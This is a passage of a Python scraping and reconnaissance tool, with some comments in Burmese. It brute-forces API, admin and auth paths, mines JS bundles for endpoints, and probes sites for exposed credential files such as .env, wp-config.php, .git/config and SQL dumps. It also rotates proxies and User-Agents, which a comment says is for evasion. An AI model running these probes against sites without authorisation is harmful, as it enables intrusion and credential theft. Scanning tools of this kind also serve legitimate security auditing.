        prop = tag.get('property', '') + tag.get('name', '')
        if any(k in prop.lower() for k in ('image','thumbnail','banner','icon')):
            c = tag.get('content', '')
            if c.startswith('http'): assets.add(c)

    # ── Object / Embed ────────────────────────────
    for tag in soup.find_all(['object', 'embed']):
        v = tag.get('data', '') or tag.get('src', '')
        if v: assets.add(urljoin(page_url, v))

    # ── Regex sweep: static files in raw HTML/JS ──
    for m in re.finditer(
        r'["\']((https?://|/)[^"\'<>\s]+\.(js|css|woff2?|ttf|otf|eot'
        r'|png|jpg|jpeg|gif|svg|webp|avif|ico'
        r'|mp4|webm|mp3|ogg|wav'
        r'|pdf|zip|apk)(\?[^"\'<>\s]*)?)["\']',
        html, re.IGNORECASE
    ):
        u = m.group(1)
        if u.startswith('/'):
            u = urljoin(page_url, u)
        assets.add(u)

    # ── JSON-LD / structured data images ─────────
    for tag in soup.find_all('script', type='application/ld+json'):
        txt = tag.string or ''
        for m in re.finditer(r'"(https?://[^"]+\.(jpg|jpeg|png|webp|gif|svg))"', txt):
            assets.add(m.group(1))

    return assets


def extract_css_assets(css: str, css_url: str) -> set:
    assets = set()
    for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
        u = u.strip().strip('"\'')
        if u and not u.startswith('data:') and not u.startswith('#'):
            assets.add(urljoin(css_url, u))
    for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
        assets.add(urljoin(css_url, u))
    return assets


def extract_media_from_js(js_content: str, base_url: str) -> set:
    """
    Mine JS/JSON files for media URLs.
    Useful for React/Vue apps that store image paths in JS bundles.
    """
    assets = set()
    # Full URLs
    for m in re.finditer(
        r'["\`](https?://[^"\'`<>\s]{8,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
        js_content, re.IGNORECASE
    ):
        assets.add(m.group(1))
    # Relative paths
    for m in re.finditer(
        r'["\`](/[^"\'`<>\s]{3,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
        js_content, re.IGNORECASE
    ):
        assets.add(urljoin(base_url, m.group(1)))
    return assets


# ══════════════════════════════════════════════════
# 🗺️  SITEMAP PARSER
# ══════════════════════════════════════════════════

def fetch_sitemap(base_url: str) -> set:
    """
    Fetch sitemap.xml (and sitemap index) — returns all page URLs.
    Supports: /sitemap.xml, /sitemap_index.xml, /robots.txt discovery
    """
    urls   = set()

    def _fetch_one_sitemap(url: str, depth: int = 0):
        if depth > 3:   # FIX: recursion depth limit
            return
        try:
            r = requests.get(url, headers=_get_headers(), timeout=15, verify=False, proxies=proxy_manager.get_proxy())
            if r.status_code != 200:
                return
            text = r.text
            # Sitemap index → recurse
            if '<sitemapindex' in text:
                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
                    sub = m.group(1).strip()
                    if sub not in urls:
                        _fetch_one_sitemap(sub, depth + 1)
            else:
                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
                    urls.add(m.group(1).strip())
        except Exception:
            pass

    # Try common sitemap locations
    parsed = urlparse(base_url)
    root   = f"{parsed.scheme}://{parsed.netloc}"

    # Check robots.txt for sitemap pointer first
    try:
        r = requests.get(f"{root}/robots.txt", headers=HEADERS,
                         timeout=8, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r.status_code == 200:
            for m in re.finditer(r'(?i)sitemap:\s*(https?://\S+)', r.text):
                _fetch_one_sitemap(m.group(1).strip())
    except Exception:
        pass

    if not urls:
        for path in ['/sitemap.xml', '/sitemap_index.xml',
                     '/sitemap/sitemap.xml', '/wp-sitemap.xml',
                     '/news-sitemap.xml', '/post-sitemap.xml',
                     '/page-sitemap.xml', '/product-sitemap.xml']:
            _fetch_one_sitemap(root + path)

    # Filter to same domain only
    netloc = parsed.netloc
    return {u for u in urls if urlparse(u).netloc == netloc}


# ══════════════════════════════════════════════════
# 🔌  API ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════

# Common API paths for e-commerce + news/blog sites
_API_PATHS_ECOMMERCE = [
    # General Ecommerce
    '/api/products', '/api/v1/products', '/api/v2/products',
    '/api/categories', '/api/v1/categories',
    '/api/items', '/api/inventory',
    '/api/cart', '/api/orders', '/api/v1/orders',
    '/api/checkout', '/api/payments', '/api/shipping', # Added checkout & payments
    '/api/search', '/api/v1/search',
    '/api/users', '/api/v1/users', '/api/customers',   # Added customers
    '/api/config', '/api/settings',
    
    # WooCommerce REST API
    '/wp-json/wc/v3/products', '/wp-json/wc/v3/categories',
    '/wp-json/wc/v3/orders', '/wp-json/wc/v3/customers',
    '/wp-json/wc/v2/products', '/wp-json/wc/v2/orders',
    
    # Magento
    '/rest/V1/products', '/rest/V1/categories', '/rest/V1/orders',
    '/rest/default/V1/products',
    
    # GraphQL
    '/graphql', '/api/graphql', '/v1/graphql', '/graphql/schema.json',
    
    # Shopify
    '/products.json', '/collections.json', '/pages.json',
    '/collections/all/products.json', '/admin/api/2023-10/products.json',
    
    # General Base
    '/api', '/api/v1', '/api/v2', '/api/v3',
    '/rest/v1', '/rest/api',
]

_API_PATHS_NEWS = [
    # WordPress REST API
    '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages',
    '/wp-json/wp/v2/categories', '/wp-json/wp/v2/tags',
    '/wp-json/wp/v2/media', '/wp-json/wp/v2/users', '/wp-json',
    
    # General news APIs
    '/api/articles', '/api/posts', '/api/news', '/api/blogs',
    '/api/v1/articles', '/api/v1/posts', '/api/v2/posts',
    
    # Feeds & Sitemaps
    '/api/feed', '/feed.json', '/feed/json',
    '/rss', '/rss.xml', '/feed', '/feed.rss',
    '/atom.xml', '/sitemap.xml', '/sitemap_index.xml', '/sitemap-news.xml',
    
    # Ghost CMS
    '/ghost/api/v4/content/posts/', '/ghost/api/v3/content/posts/',
    
    # Strapi
    '/api/articles?populate=*', '/api/posts?populate=*',
    
    # Drupal JSON:API
    '/jsonapi/node/article', '/jsonapi/node/page',
]

_API_PATHS_GENERAL = [
    # Health & Info
    '/api/health', '/api/status', '/health', '/ping', '/healthcheck',
    '/version', '/api/version', '/info', '/api/info',
    
    # Documentation & Swagger
    '/.well-known/openapi.json', '/openapi.json', '/openapi.yaml',
    '/swagger.json', '/swagger.yaml', '/api-docs', '/swagger-ui.html',
    '/docs', '/api/docs', '/redoc', '/api/redoc',
    
    # Well-known & Discovery
    '/.well-known/security.txt', '/.well-known/core-config',
]

# ----------------- အသစ်ထပ်တိုးထားသောအပိုင်းများ ----------------- #

_API_PATHS_AUTH = [
    # Login & Authentication
    '/api/login', '/api/v1/login', '/api/auth', '/api/v1/auth',
    '/api/auth/login', '/api/users/login', '/api/admin/login',
    '/api/register', '/api/v1/register', '/api/auth/register', '/api/signup',
    
    # Tokens (JWT, OAuth)
    '/api/token', '/api/v1/token', '/oauth/token', '/oauth2/token',
    '/api/refresh', '/api/token/refresh', '/api/auth/refresh',
    
    # Current User Profile & Logout
    '/api/me', '/api/v1/me', '/api/user', '/api/current_user',
    '/api/logout', '/api/auth/logout',
    
    # WordPress Specific Auth Plugins (JWT Authentication)
    '/wp-json/jwt-auth/v1/token', '/wp-json/aam/v2/authenticate',
]

_API_PATHS_ADMIN = [
    # Admin Panels & Dashboards
    '/api/admin', '/api/v1/admin', '/admin/api',
    '/api/dashboard', '/api/system', '/api/config', '/api/settings',
    '/api/admin/users', '/api/admin/settings',
    '/admin/dashboard.json', '/api/stats', '/api/metrics',
    
    # Spring Boot Actuator (Java)
    '/actuator/health', '/actuator/info', '/manage/health', '/manage/info'
]

# ── API paths တိုးချဲ့ ────────────────────────────
_API_PATHS_MOBILE = [
    # Mobile / App APIs
    '/api/v1/app', '/api/v2/app', '/api/mobile',
    '/api/v1/config', '/api/v2/config',
    '/api/notifications', '/api/v1/notifications',
    '/api/v1/feed', '/api/v2/feed',
    '/api/social', '/api/friends', '/api/followers',
    '/api/messages', '/api/v1/messages',
    '/api/upload', '/api/media', '/api/files',
    '/api/analytics', '/api/events', '/api/tracking',
]

_API_PATHS_FINANCE = [
    # Fintech / Payment / Crypto
    '/api/payments', '/api/v1/payments', '/api/transactions',
    '/api/wallet', '/api/balance', '/api/withdraw', '/api/deposit',
    '/api/exchange', '/api/rates', '/api/currency',
    '/api/invoice', '/api/billing', '/api/subscriptions',
    '/api/v1/subscriptions', '/api/plans',
    '/api/crypto', '/api/coins', '/api/market',
    '/api/accounts', '/api/v1/accounts', '/api/v2/accounts',
]

_API_PATHS_SAAS = [
    # SaaS / Dashboard
    '/api/workspaces', '/api/projects', '/api/teams',
    '/api/members', '/api/invitations', '/api/roles',
    '/api/reports', '/api/exports', '/api/imports',
    '/api/webhooks', '/api/integrations', '/api/plugins',
    '/api/audit', '/api/logs', '/api/activity',
    # Laravel / Sanctum / Passport
    '/api/csrf-cookie', '/api/user', '/sanctum/csrf-cookie',
    '/oauth/authorize', '/oauth/clients', '/oauth/personal-access-tokens',
    # Django REST Framework
    '/api/schema/', '/api/schema/swagger-ui/', '/api/schema/redoc/',
    # FastAPI / Starlette
    '/docs', '/redoc', '/openapi.json',
    # Next.js API routes
    '/api/_next', '/api/auth/[...nextauth]', '/api/auth/session',
    '/api/auth/csrf', '/api/auth/providers',
    # Supabase / Firebase-style
    '/rest/v1/', '/auth/v1/', '/storage/v1/',
]

ALL_API_PATHS = list(dict.fromkeys(
    _API_PATHS_ECOMMERCE +
    _API_PATHS_NEWS      +
    _API_PATHS_GENERAL   +
    _API_PATHS_AUTH      +   # ← Fix: ပါမနေတာ ထည့်
    _API_PATHS_ADMIN     +   # ← Fix: ပါမနေတာ ထည့်
    _API_PATHS_MOBILE    +
    _API_PATHS_FINANCE   +
    _API_PATHS_SAAS
))


# ── API URL patterns in JS bundles ─────────────
_JS_API_PATTERNS = [
    re.compile(r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""(?:url|endpoint|baseURL|apiUrl|API_URL)\s*[:=]\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""['"`](/api/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/rest/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/v\d+/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"['\"`](https?://[^\s'\"` ]{10,200}/api/[^\s'\"` ?#]{2,100})['\"`]"),
]

def _extract_api_urls_from_js(js_text: str, base_root: str) -> list:
    """JS bundle/source ထဲက API URL တွေ mine လုပ်"""
    found = set()
    for pat in _JS_API_PATTERNS:
        for m in pat.findall(js_text):
            url = m.strip()
            if not url or len(url) < 4:
                continue
            if url.startswith('/'):
                url = base_root + url
            if url.startswith('http') and '/api/' not in url and '/rest/' not in url and '/v' not in url:
                continue
            if url.startswith('http') or url.startswith('/'):
                found.add(url)
    return list(found)


def _extract_api_urls_from_html(html: str, base_root: str) -> list:
    """HTML source ထဲက API references mine လုပ်"""
    found = set()
    soup  = BeautifulSoup(html, 'html.parser')

    # data-* attributes
    for tag in soup.find_all(True):
        for attr, val in tag.attrs.items():
            if isinstance(val, str) and ('/api/' in val or '/rest/' in val):
                if val.startswith('/') or val.startswith('http'):
                    url = (base_root + val) if val.startswith('/') else val
                    found.add(url.split('?')[0])

    # Inline scripts
    for script in soup.find_all('script'):
        if script.string:
            for url in _extract_api_urls_from_js(script.string, base_root):
                found.add(url.split('?')[0])

    # <link rel="..."> and <a href="..."> with /api/
    for tag in soup.find_all(['link', 'a'], href=True):
        href = tag['href']
        if '/api/' in href or '/graphql' in href:
            url = (base_root + href) if href.startswith('/') else href
            found.add(url.split('?')[0])

    return list(found)


def _mine_js_bundles(html: str, root: str, proxies) -> list:
    """External JS files တွေ download ပြီး API URLs ထုတ်"""
    soup = BeautifulSoup(html, 'html.parser')
    js_urls = []
    for tag in soup.find_all('script', src=True):
        src = tag['src']
        if not src: continue
        if src.startswith('//'):
            src = 'https:' + src
        elif src.startswith('/'):
            src = root + src
        if src.startswith('http') and ('chunk' in src or 'bundle' in src or
                'main' in src or 'app' in src or 'vendor' in src or 'index' in src):
            js_urls.append(src)

    found = set()
    for js_url in js_urls[:8]:   # max 8 JS bundles
        try:
            r = requests.get(js_url, headers=HEADERS, timeout=10, verify=False, proxies=proxy_manager.get_proxy())
            if r.status_code == 200 and len(r.text) > 100:
                for url in _extract_api_urls_from_js(r.text, root):
                    found.add(url.split('?')[0])
        except Exception:
            pass
    return list(found)


def _check_robots_and_sitemap(root: str, proxies) -> list:
    """robots.txt / sitemap.xml ထဲက API paths ရှာ"""
    found = set()
    # robots.txt — Disallow paths with /api/
    try:
        r = requests.get(root + '/robots.txt', headers=HEADERS,
                         timeout=8, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r.status_code == 200:
            for line in r.text.splitlines():
                line = line.strip()
                if line.lower().startswith(('disallow:', 'allow:')):
                    path = line.split(':', 1)[1].strip()
                    if any(kw in path for kw in ['/api/', '/rest/', '/v1/', '/v2/', '/graphql']):
                        found.add(root + path.split('*')[0].rstrip('$'))
    except Exception:
        pass
    return list(found)


def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
    """
    Comprehensive API discovery:
    1. Predefined path brute-force (ALL_API_PATHS)
    2. HTML source mining (data-* attrs, inline scripts)
    3. JS bundle mining (fetch/axios/url patterns)
    4. robots.txt / sitemap discovery
    5. CORS header detection
    Returns: {"found": [...], "js_mined": [...], "html_mined": [...],
              "robots": [...], "stats": {...}}
    """
    parsed  = urlparse(base_url)
    root    = f"{parsed.scheme}://{parsed.netloc}"

    # ── Phase 0: Fetch homepage for mining ───────
    homepage_html = None
    try:
        r0 = requests.get(base_url, headers=HEADERS, timeout=12, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r0.status_code == 200:
            homepage_html = r0.text
    except Exception:
        pass

    # ── Phase 1: HTML + JS mining (parallel) ─────
    html_mined = []
    js_mined   = []
    robots_found = []

    if homepage_html:
        if progress_cb: progress_cb("🔍 HTML source mining...")
        html_mined = _extract_api_urls_from_html(homepage_html, root)

        if progress_cb: progress_cb("📦 JS bundle mining...")
        js_mined   = _mine_js_bundles(homepage_html, root, None)

    if progress_cb: progress_cb("🤖 robots.txt scanning...")
    robots_found = _check_robots_and_sitemap(root, None)

    # ── Phase 2: Path brute-force ─────────────────
    found  = []
    seen   = set()

    def _probe(path: str) -> dict | None:
        url = root + path if path.startswith('/') else path
        try:
            r = requests.get(
                url,
                headers={**HEADERS, 'Accept': 'application/json, text/plain, */*'},
                timeout=7, verify=False,
                allow_redirects=True,
                proxies=proxy_manager.get_proxy()
            )
            ct  = r.headers.get('Content-Type', '')
            cors = r.headers.get('Access-Control-Allow-Origin', '')
            size = len(r.content)

            endpoint = {
                "url":    url,
                "status": r.status_code,
                "cors":   cors if cors else None,
                "size_b": size,
                "preview": "",
                "type":   "OTHER",
                "method": "GET",
            }

            if r.status_code in (401, 403):
                endpoint["type"] = "PROTECTED"
                return endpoint

            if r.status_code in (405,):   # Method Not Allowed → endpoint exists
                endpoint["type"] = "PROTECTED"
                endpoint["note"] = "POST only"
                return endpoint

            if r.status_code == 200 and size > 5:
                body = r.text[:400].strip()
                if 'json' in ct or body.startswith(('{', '[')):
                    endpoint["type"]    = "JSON_API"
                    endpoint["preview"] = body[:150]
                    # Try to detect if it's GraphQL
                    if '/graphql' in url or ('"data"' in body and '"errors"' in body):
                        endpoint["type"] = "GRAPHQL"
                elif 'xml' in ct or 'rss' in ct or 'atom' in ct:
                    endpoint["type"]    = "XML/RSS"
                    endpoint["preview"] = body[:100]
                elif 'html' in ct and ('/swagger' in url or '/redoc' in url or '/docs' in url):
                    endpoint["type"]    = "API_DOCS"
                    endpoint["preview"] = "Swagger/OpenAPI docs"
                elif size > 20:
                    endpoint["type"]    = "OTHER"
                    endpoint["preview"] = body[:80]
                else:
                    return None
                return endpoint
        except Exception:
            pass
        return None

    # ── Probe ALL paths (brute-force) ─────────────
    # Also probe mined URLs
    all_probe_paths = list(ALL_API_PATHS)
    # Add mined paths (path-only)
    for mined_url in (html_mined + js_mined + robots_found):
        try:
            p = urlparse(mined_url).path
            if p and p not in all_probe_paths and len(p) < 150:
                all_probe_paths.append(p)
        except Exception:
            pass

    total = len(all_probe_paths)
    if progress_cb:
        progress_cb(f"🔌 Path scanning: `{total}` paths...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, path): path for path in all_probe_paths}
        done = 0
        for fut in concurrent.futures.as_completed(fmap, timeout=90):
            done += 1
            try:
                result = fut.result(timeout=10)
                if result and result["url"] not in seen:
                    seen.add(result["url"])
                    found.append(result)
            except Exception:
                pass
            if progress_cb and done % 15 == 0:
                progress_cb(
                    f"🔌 Scanning: `{done}/{total}`\n"
                    f"✅ JSON: `{sum(1 for e in found if e['type']=='JSON_API')}` | "
                    f"🔒 Protected: `{sum(1 for e in found if e['type']=='PROTECTED')}` | "
                    f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}`"
                )

    _type_order = {"JSON_API": 0, "GRAPHQL": 1, "XML/RSS": 2,
                   "API_DOCS": 3, "PROTECTED": 4, "OTHER": 5}
    found.sort(key=lambda x: _type_order.get(x["type"], 9))

    return {
        "found":       found,
        "js_mined":    list(set(js_mined)),
        "html_mined":  list(set(html_mined)),
        "robots":      robots_found,
        "stats": {
            "total_probed":   total,
            "json_apis":      sum(1 for e in found if e["type"] == "JSON_API"),
            "graphql":        sum(1 for e in found if e["type"] == "GRAPHQL"),
            "xml_rss":        sum(1 for e in found if e["type"] == "XML/RSS"),
            "api_docs":       sum(1 for e in found if e["type"] == "API_DOCS"),
            "protected":      sum(1 for e in found if e["type"] == "PROTECTED"),
            "other":          sum(1 for e in found if e["type"] == "OTHER"),
            "js_urls_found":  len(js_mined),
            "html_urls_found":len(html_mined),
        }
    }



def get_internal_links(html: str, base_url: str) -> set:
    soup    = BeautifulSoup(html, 'html.parser')
    netloc  = urlparse(base_url).netloc
    links   = set()
    for a in soup.find_all('a', href=True):
        h = a['href']
        if h.startswith(('#','mailto:','tel:','javascript:')): continue
        full = urljoin(base_url, h)
        p    = urlparse(full)
        if p.netloc == netloc:
            links.add(p._replace(fragment='').geturl())
    return links



# ══════════════════════════════════════════════════
# ✂️  FILE SPLITTER
# ══════════════════════════════════════════════════

def split_zip(zip_path: str, part_mb: float = SPLIT_MB) -> list:
    part_size = int(part_mb * 1024 * 1024)
    base  = zip_path.replace('.zip','')
    parts = []
    num   = 1
    with open(zip_path,'rb') as f:
        while True:
            chunk = f.read(part_size)
            if not chunk: break
            p = f"{base}.part{num:02d}.zip"
            with open(p,'wb') as pf: pf.write(chunk)
            parts.append(p)
            num += 1
    return parts

def needs_split(path: str) -> bool:
    return os.path.getsize(path) > SPLIT_MB * 1024 * 1024


# ══════════════════════════════════════════════════
# 🛡️  VULNERABILITY SCANNER  v4
#     - Cloudflare catch-all detection
#     - Baseline fingerprint comparison
#     - Adaptive delay (anti-rate-limit)
#     - Real subdomain verification
# ══════════════════════════════════════════════════

_COMMON_SUBDOMAINS = [
    "api", "admin", "dev", "staging", "test",
    "beta", "app", "portal", "dashboard", "panel",
    "manage", "backend", "internal", "static",
    "mail", "backup", "vpn", "git", "gitlab",
    "jenkins", "ci", "build", "docs", "help",
    "shop", "store", "blog", "status", "monitor",
    "db", "database", "phpmyadmin", "cdn", "media",
    "assets", "files", "upload", "img", "images",
    "auth", "login", "sso", "oauth", "api2",
]

_VULN_PATHS = [
    # CRITICAL — Credentials
    ("/.env",                     "🔑 .env file",               "CRITICAL"),
    ("/.env.local",               "🔑 .env.local",              "CRITICAL"),
    ("/.env.backup",              "🔑 .env.backup",             "CRITICAL"),
    ("/.env.production",          "🔑 .env.production",         "CRITICAL"),
    ("/wp-config.php",            "🔑 wp-config.php",           "CRITICAL"),
    ("/wp-config.php.bak",        "🔑 wp-config.php.bak",       "CRITICAL"),
    ("/config.php",               "🔑 config.php",              "HIGH"),
    ("/config.yml",               "🔑 config.yml",              "HIGH"),
    ("/config.json",              "🔑 config.json",             "HIGH"),
    ("/database.yml",             "🔑 database.yml",            "HIGH"),
    ("/settings.py",              "🔑 settings.py",             "HIGH"),
    # CRITICAL — VCS
    ("/.git/config",              "📁 .git/config",             "CRITICAL"),
    ("/.git/HEAD",                "📁 .git/HEAD",               "CRITICAL"),
    ("/.svn/entries",             "📁 .svn entries",            "HIGH"),
    # CRITICAL — Backups
    ("/backup.zip",               "🗜️ backup.zip",              "CRITICAL"),
    ("/backup.sql",               "🗜️ backup.sql",              "CRITICAL"),
    ("/dump.sql",                 "🗜️ dump.sql",                "CRITICAL"),
    ("/db.sql",                   "🗜️ db.sql",                  "CRITICAL"),
    ("/backup.tar.gz",            "🗜️ backup.tar.gz",           "CRITICAL"),
    ("/site.zip",                 "🗜️ site.zip",                "HIGH"),
    # HIGH — Admin panels
    ("/phpmyadmin/",              "🔐 phpMyAdmin",              "HIGH"),
    ("/pma/",                     "🔐 phpMyAdmin /pma/",        "HIGH"),
    ("/adminer.php",              "🔐 Adminer DB UI",           "HIGH"),
    ("/admin",                    "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/",                   "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/login",              "🔐 Admin Login",             "MEDIUM"),
    ("/wp-admin/",                "🔐 WordPress Admin",         "MEDIUM"),
    ("/administrator/",           "🔐 Joomla Admin",            "MEDIUM"),
    ("/dashboard",                "🔐 Dashboard",               "MEDIUM"),
    ("/login",                    "🔐 Login Page",              "LOW"),
    # HIGH — Logs
    ("/error.log",                "📋 error.log",               "HIGH"),
    ("/access.log",               "📋 access.log",              "HIGH"),
    ("/debug.log",                "📋 debug.log",               "HIGH"),
    ("/storage/logs/laravel.log", "📋 Laravel log",             "HIGH"),
    # MEDIUM — Server info
    ("/server-status",            "⚙️ Apache server-status",   "MEDIUM"),
    ("/web.config",               "⚙️ web.config",             "HIGH"),
    ("/.htaccess",                "⚙️ .htaccess",              "MEDIUM"),
    ("/xmlrpc.php",               "⚠️ xmlrpc.php",             "MEDIUM"),
    # LOW
    ("/composer.json",            "📦 composer.json",           "LOW"),
    ("/package.json",             "📦 package.json",            "LOW"),
    ("/requirements.txt",         "📦 requirements.txt",        "LOW"),
    # INFO
    ("/robots.txt",               "🤖 robots.txt",              "INFO"),
    ("/sitemap.xml",              "🗺️ sitemap.xml",             "INFO"),
]

_SEV_EMOJI = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"⚪"}
_SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
_SEC_HEADERS = {
    "Strict-Transport-Security": ("HSTS",           "HIGH"),
    "Content-Security-Policy":   ("CSP",            "MEDIUM"),
    "X-Frame-Options":           ("X-Frame-Options","MEDIUM"),
    "X-Content-Type-Options":    ("X-Content-Type", "LOW"),
    "Referrer-Policy":           ("Referrer-Policy","LOW"),
    "Permissions-Policy":        ("Permissions-Policy","LOW"),
}
_FAKE_SIGS = [
    b"404", b"not found", b"page not found",
    b"does not exist", b"no such file",
]

# User-Agents rotation (avoid rate limiting) — 60+ UAs for better evasion (updated 2025/2026)
_UA_LIST = [
    # ── Chrome — Windows (latest) ────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    # ── Chrome — Windows (slightly older, still common) ──────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.185 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36',
    # ── Chrome — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Chrome — Linux ───────────────────────────────────────────────
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Firefox — Windows ────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Firefox — macOS ──────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:128.0) Gecko/20100101 Firefox/128.0',
    # ── Firefox — Linux ──────────────────────────────────────────────
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Safari — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
